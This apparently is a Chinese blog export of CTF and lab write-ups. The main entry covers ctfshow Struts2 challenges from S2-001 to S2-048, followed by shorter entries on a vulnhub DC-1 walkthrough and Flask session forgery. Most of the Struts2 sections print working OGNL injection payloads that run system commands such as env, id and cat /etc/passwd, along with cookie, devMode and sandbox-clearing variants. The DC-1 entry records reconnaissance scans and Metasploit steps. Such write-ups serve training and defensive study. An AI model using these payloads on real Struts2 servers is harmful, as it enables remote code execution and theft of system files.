    <content><![CDATA[<h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><p>点进去发现一个登录框</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_12.png"></p>
<p>没思路 看wp</p>
<p>了解下</p>
<p>Struts2是用Java语言编写的一个基于MVC设计模式的Web应用框架</p>
<p>描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struts2漏洞 S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%&#123;value&#125;并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于%&#123;value&#125;对提交的数据执行OGNL表达式解析，因此服务器可以直接发送有效载荷来执行命令。</span><br></pre></td></tr></table></figure>

<p>在这里提到了 OGNL 表达式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OGNL（Object-Graph Navigation Language）是一种用于在Java应用程序中访问和操作对象图的表达式语言。OGNL最初是由Drew Davidson和Luke Blanshard开发的，主要用于Java的对象属性访问和修改，类似于其他表达式语言如JSTL、EL等。OGNL表达式可以用来简化对复杂对象结构的访问和操作，非常适合于MVC框架中绑定表单数据到模型对象的场景</span><br></pre></td></tr></table></figure>

<h3 id="OGNL-表达式的基本功能"><a href="#OGNL-表达式的基本功能" class="headerlink" title="OGNL 表达式的基本功能"></a>OGNL 表达式的基本功能</h3><ol>
<li><ol>
<li><strong>对象属性访问</strong>：使用<code>.</code>（点号）访问对象的属性。例如，<code>person.name</code> 可以获取<code>person</code>对象的<code>name</code>属性。</li>
<li><strong>集合和数组访问</strong>：OGNL 支持通过索引访问集合和数组中的元素。例如，<code>list[0]</code> 可以访问列表中的第一个元素。</li>
<li><strong>方法调用</strong>：OGNL 可以调用对象的方法。例如，<code>person.getName()</code> 可以调用<code>person</code>对象的<code>getName()</code>方法。</li>
<li><strong>操作符支持</strong>：OGNL 支持多种操作符，例如算术操作符（<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>），逻辑操作符（<code>&amp;&amp;</code>, <code>||</code>），比较操作符（<code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>）等。</li>
<li><strong>上下文变量</strong>：OGNL 支持通过 <code>#</code> 访问上下文变量。例如，<code>#root</code> 访问当前的根对象，<code>#this</code> 访问当前的对象。</li>
<li><strong>表达式求值</strong>：可以使用OGNL表达式直接求值或进行复杂的逻辑运算。</li>
</ol>
</li>
</ol>
<p>我们在这里简单的了解下这个表达式</p>
<p>如何分辨这种类型的漏洞的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.常见的action.do后缀结尾</span><br><span class="line">2.user!list.action带感叹号式</span><br><span class="line">3.test?actionErrors=11111111111404/500响应并目页面打印11111111111</span><br><span class="line">4.后缀不带action do，不能说明不是struts2</span><br></pre></td></tr></table></figure>

<p>s2-001是一个struts2命令执行漏洞编号，漏洞介绍：<a href="https://www.freebuf.com/column/224041.html">https://www.freebuf.com/column/224041.html</a></p>
<p>漏洞部分代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">translateVariables</span><span class="params">(<span class="type">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> expression.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> start + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                --count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">        <span class="keyword">if</span> (evaluator != <span class="literal">null</span>) &#123;</span><br><span class="line">            o = evaluator.evaluate(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> expression.substring(<span class="number">0</span>, start);</span><br><span class="line">        <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> expression.substring(end + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                result = left + o;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = o;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                result = result + right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expression = left + o + right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = left + right;</span><br><span class="line">            expression = left + right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//这段代码的核心流程就是不断在 expression 中查找占位符 &#123;&#125;，解析变量并替换成对应的值。如果提供了 evaluator，还会对找到的值进一步处理。最终返回的结果是替换后的完整字符串或对象，并且可以根据需要转换成指定类型。</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);<span class="comment">//尝试在字符串 expression 中找到一个复合字符串的起始位置，该复合字符串是由变量 open 和 &quot;&#123;&quot; 组合而成的。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br></pre></td></tr></table></figure>

<p>简单来说就是你输出给password的是OGNL 表达式 这样一大串代码会直接执行你的代码</p>
<p>例如我们执行一个**%{1-1}**</p>
<p>发现回显一个0</p>
<p>根据上面的OGNL 表达的用法（用下wp的payload）参考：<a href="https://blog.csdn.net/q20010619/article/details/120729447">https://blog.csdn.net/q20010619/article/details/120729447</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 获取tomcat路径</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 获取web路径</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line">// 命令执行 env，flag就在其中</span><br><span class="line">password=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_11.png"></p>
<h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p>这个漏洞有个检测工具后</p>
<p>下载地址：<a href="https://github.com/abc123info/Struts2VulsScanTools/releases">https://github.com/abc123info/Struts2VulsScanTools/releases</a></p>
<p>S2-003</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果</span><br><span class="line"></span><br><span class="line">影响版本：Struts 2.0.0 - Struts 2.0.11.2</span><br></pre></td></tr></table></figure>

<p>S2-005</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003</span><br></pre></td></tr></table></figure>

<p>Struts2框架在处理表单数据时，会将表单数据绑定到Action对象的相应属性上。攻击者可以通过在表单中提交特定的字符串，从而绕过Struts2的安全过滤机制，直接执行任意代码</p>
<p>工具展示</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_17.png"></p>
<h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><p>工具解决即可</p>
<p>了解下漏洞S2-007</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当用户提交 age 为字符串而非整形数值时，后端用代码拼接 &quot;&#x27;&quot; + value + &quot;&#x27;&quot; 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</span><br></pre></td></tr></table></figure>

<p>age 框执行了命令</p>
<h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。<br>姿势1：cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie:(&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;)(1)(2)=Aluvion; (&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;)(1)(2)=Twings;</span><br></pre></td></tr></table></figure>

<p>姿势2：调试模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29)</span><br></pre></td></tr></table></figure>

<h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_18.png"></p>
<p>漏洞原理：</p>
<p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于#号，同样使用编码\u0023或\43进行绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。</p>
<p>但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用&#x2F;helloword.acton?example&#x3D;<OGNL statement>&amp;(example)(‘xxx’)&#x3D;1的方法来执行它，从而绕过官方对#、\等特殊字符的防御。</p>
<p>访问<a href="http://your-ip:8080/ajax/example5.action%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E8%AF%A5%E6%8E%A7%E5%88%B6%E5%99%A8%E3%80%82%E6%8C%89%E7%85%A7%E5%8E%9F%E7%90%86%E4%B8%AD%E8%AF%B4%E5%88%B0%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E5%B0%86OGNL%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E6%94%BE%E5%9C%A8name%E5%8F%82%E6%95%B0%E9%87%8C">http://your-ip:8080/ajax/example5.action即可访问该控制器。按照原理中说到的方法，将OGNL利用代码放在name参数里</a></p>
<p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure>

<p>工具直接出</p>
<h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p>由url可以得知漏洞是S2-012</p>
<p>漏洞原理：</p>
<p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：、</p>
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。

<p>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p>Struts2 标签中 &lt;s:a&gt; 和 &lt;s:url&gt; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</p>
<p>none - 链接不包含请求的任意参数值（默认）<br>get - 链接只包含 GET 请求中的参数和其值<br>all - 链接包含 GET 和 POST 所有参数和其值<br>&lt;s:a&gt;用来显示一个超链接，当includeParams&#x3D;all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。<br>poc：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">// 或</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<p>感觉工具都能直接写出来 后面的就不写了</p>
<h1 id="web295-S2-048"><a href="#web295-S2-048" class="headerlink" title="web295:S2-048"></a>web295:S2-048</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc:%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub DC-1</title>
    <url>/2025/02/16/vulnhub-DC-1/</url>
    <content><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.205.1   00:50:56:c0:00:01       (Unknown)</span><br><span class="line">192.168.205.2   00:50:56:f7:4f:9c       (Unknown)</span><br><span class="line">192.168.205.129 00:0c:29:04:0c:de       (Unknown)</span><br><span class="line">192.168.205.254 00:50:56:e2:1c:01       (Unknown)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.874 seconds (136.61 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<p>发现192.168.205.129 是我们的靶机ip 开始信息搜集</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sS -sV -A -T4 -p- 192.168.205.129</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 04:26 EST</span><br><span class="line">Nmap scan report for 192.168.205.129</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          44174/udp6  status</span><br><span class="line">|   100024  1          46616/tcp   status</span><br><span class="line">|   100024  1          46812/udp   status</span><br><span class="line">|_  100024  1          46918/tcp6  status</span><br><span class="line">46616/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:04:0C:DE (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms 192.168.205.129</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds</span><br></pre></td></tr></table></figure>

<p>得到22 80 111 三个端口</p>
<p>22是ssh 80是http服务 </p>
<p>首先进入web页面看一看有什么</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250216173216.png"></p>
<p>一个登录页面 拿一下网站的基本信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# whatweb -v 192.168.205.129</span><br><span class="line">WhatWeb report for http://192.168.205.129</span><br><span class="line">Status    : 200 OK</span><br><span class="line">Title     : Welcome to Drupal Site | Drupal Site</span><br><span class="line">IP        : 192.168.205.129</span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line"></span><br><span class="line">Summary   : Apache[2.2.22], Content-Language[en], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PasswordField[pass], PHP[5.4.45-0+deb7u14], Script[text/javascript], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]   </span><br><span class="line"></span><br><span class="line">Detected Plugins:</span><br><span class="line">[ Apache ]</span><br><span class="line">        The Apache HTTP Server Project is an effort to develop and </span><br><span class="line">        maintain an open-source HTTP server for modern operating </span><br><span class="line">        systems including UNIX and Windows NT. The goal of this </span><br><span class="line">        project is to provide a secure, efficient and extensible </span><br><span class="line">        server that provides HTTP services in sync with the current </span><br><span class="line">        HTTP standards. </span><br><span class="line"></span><br><span class="line">        Version      : 2.2.22 (from HTTP Server Header)</span><br><span class="line">        Google Dorks: (3)</span><br><span class="line">        Website     : http://httpd.apache.org/</span><br><span class="line"></span><br><span class="line">[ Content-Language ]</span><br><span class="line">        Detect the content-language setting from the HTTP header. </span><br><span class="line"></span><br><span class="line">        String       : en</span><br><span class="line"></span><br><span class="line">[ Drupal ]</span><br><span class="line">        Drupal is an opensource CMS written in PHP. </span><br><span class="line"></span><br><span class="line">        Aggressive function available (check plugin file or details).</span><br><span class="line">        Google Dorks: (1)</span><br><span class="line">        Website     : http://www.drupal.org</span><br><span class="line"></span><br><span class="line">[ HTTPServer ]</span><br><span class="line">        HTTP server header string. This plugin also attempts to </span><br><span class="line">        identify the operating system from the server header. </span><br><span class="line"></span><br><span class="line">        OS           : Debian Linux</span><br><span class="line">        String       : Apache/2.2.22 (Debian) (from server string)</span><br><span class="line"></span><br><span class="line">[ JQuery ]</span><br><span class="line">        A fast, concise, JavaScript that simplifies how to traverse </span><br><span class="line">        HTML documents, handle events, perform animations, and add </span><br><span class="line">        AJAX. </span><br><span class="line"></span><br><span class="line">        Website     : http://jquery.com/</span><br><span class="line"></span><br><span class="line">[ MetaGenerator ]</span><br><span class="line">        This plugin identifies meta generator tags and extracts its </span><br><span class="line">        value. </span><br><span class="line"></span><br><span class="line">        String       : Drupal 7 (http://drupal.org)</span><br><span class="line"></span><br><span class="line">[ PHP ]</span><br><span class="line">        PHP is a widely-used general-purpose scripting language </span><br><span class="line">        that is especially suited for Web development and can be </span><br><span class="line">        embedded into HTML. This plugin identifies PHP errors, </span><br><span class="line">        modules and versions and extracts the local file path and </span><br><span class="line">        username if present. </span><br><span class="line"></span><br><span class="line">        Version      : 5.4.45-0+deb7u14</span><br><span class="line">        Google Dorks: (2)</span><br><span class="line">        Website     : http://www.php.net/</span><br><span class="line"></span><br><span class="line">[ PasswordField ]</span><br><span class="line">        find password fields </span><br><span class="line"></span><br><span class="line">        String       : pass (from field name)</span><br><span class="line"></span><br><span class="line">[ Script ]</span><br><span class="line">        This plugin detects instances of script HTML elements and </span><br><span class="line">        returns the script language/type. </span><br><span class="line"></span><br><span class="line">        String       : text/javascript</span><br><span class="line"></span><br><span class="line">[ UncommonHeaders ]</span><br><span class="line">        Uncommon HTTP server headers. The blacklist includes all </span><br><span class="line">        the standard headers and many non standard but common ones. </span><br><span class="line">        Interesting but fairly common headers should have their own </span><br><span class="line">        plugins, eg. x-powered-by, server and x-aspnet-version. </span><br><span class="line">        Info about headers can be found at www.http-stats.com </span><br><span class="line"></span><br><span class="line">        String       : x-generator (from headers)</span><br><span class="line"></span><br><span class="line">[ X-Powered-By ]</span><br><span class="line">        X-Powered-By HTTP header </span><br><span class="line"></span><br><span class="line">        String       : PHP/5.4.45-0+deb7u14 (from x-powered-by string)</span><br><span class="line"></span><br><span class="line">HTTP Headers:</span><br><span class="line">        HTTP/1.1 200 OK</span><br><span class="line">        Date: Sat, 15 Feb 2025 23:03:39 GMT</span><br><span class="line">        Server: Apache/2.2.22 (Debian)</span><br><span class="line">        X-Powered-By: PHP/5.4.45-0+deb7u14</span><br><span class="line">        Expires: Sun, 19 Nov 1978 05:00:00 GMT</span><br><span class="line">        Last-Modified: Sat, 15 Feb 2025 23:03:39 +0000</span><br><span class="line">        Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">        ETag: &quot;1739660619&quot;</span><br><span class="line">        Content-Language: en</span><br><span class="line">        X-Generator: Drupal 7 (http://drupal.org)</span><br><span class="line">        Vary: Accept-Encoding</span><br><span class="line">        Content-Encoding: gzip</span><br><span class="line">        Content-Length: 2276</span><br><span class="line">        Connection: close</span><br><span class="line">        Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>

<p>这里可以看到靶机的cms是Drupal</p>
<p>***启动Metersploit*****<em><strong>服务*</strong></em></p>
<p>搜寻drupal模块</p>
<p>使用序号一这个</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 1</span><br><span class="line"></span><br><span class="line">set Rhost 192.168.29.131 *# s设置靶机ip*</span><br><span class="line"></span><br><span class="line">set lhost 192.168.29.128 *# 设置攻机ip*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">run#</span><span class="language-bash">开始攻击</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>session伪造</title>
    <url>/2024/11/14/session%E4%BC%AA%E9%80%A0/</url>
    <content><![CDATA[<h2 id="flask的session伪造"><a href="#flask的session伪造" class="headerlink" title="flask的session伪造"></a>flask的session伪造</h2><h3 id="1-sessiond作用"><a href="#1-sessiond作用" class="headerlink" title="1.sessiond作用"></a>1.sessiond作用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。</span><br><span class="line">用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息</span><br></pre></td></tr></table></figure>

<h3 id="2-flask-session的储存方式"><a href="#2-flask-session的储存方式" class="headerlink" title="2.flask session的储存方式"></a>2.flask session的储存方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种方式：直接存在客户端的cookies中</span><br><span class="line"></span><br><span class="line">第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库</span><br><span class="line"></span><br><span class="line">flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。</span><br></pre></td></tr></table></figure>

